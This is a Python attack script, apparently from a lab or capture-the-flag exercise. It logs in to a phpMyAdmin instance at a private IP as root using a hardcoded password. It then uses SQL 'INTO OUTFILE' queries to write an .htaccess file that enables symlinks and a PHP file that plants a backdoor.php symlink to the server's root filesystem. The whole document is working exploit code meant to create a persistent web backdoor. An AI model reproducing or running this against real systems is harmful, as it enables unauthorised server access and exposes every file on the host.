#!/usr/bin/env python3
import requests

user = {
    'pma_username': 'root',
    'pma_password': "Fg-'kKXBj87E:aJ$"
}

# bypass the unsecure connection warning
requests.packages.urllib3.disable_warnings()
# we connect to website's phpmyadmin interface as root
session = requests.Session()
cred = session.post("https://10.0.2.4/phpmyadmin/index.php", verify=False, data=user)

# we need to find and store token value for next requests
for line in cred.text.split():
    if "token=" in line:
        token = line.split('=')
        break
token = token[1][0:-2]

# prepare 2 injections: 1 for allow symlinks, 1 for the symlimk itself
htaccess_query = 'SELECT 1, "Options Indexes FollowSymLinks" INTO OUTFILE ".htaccess"'
suexec_query = "SELECT 1, '<?php symlink(\"/\", \"backdoor.php\");?>' INTO OUTFILE '/var/www/forum/templates_c/suexecuted.php'"

# according to website's request, we build our data object
payload = {
    'is_js_confirmed': 0,
    'token': token,
    'pos': 0,
    'goto': 'server_sql.php',
    'message_to_show': "Your+SQL+query+has+been+executed+successfully",
    'prev_sql_query': None,
    'sql_query': htaccess_query,
    'bkm_label': None,
    'sql_delimiter': ';',
    'show_query': 1,
    'ajax_request': 'true'
}

session.post("https://10.0.2.4/phpmyadmin/import.php", verify=False, data=payload)
payload['sql_query'] = suexec_query
session.post("https://10.0.2.4/phpmyadmin/import.php", verify=False, data=payload)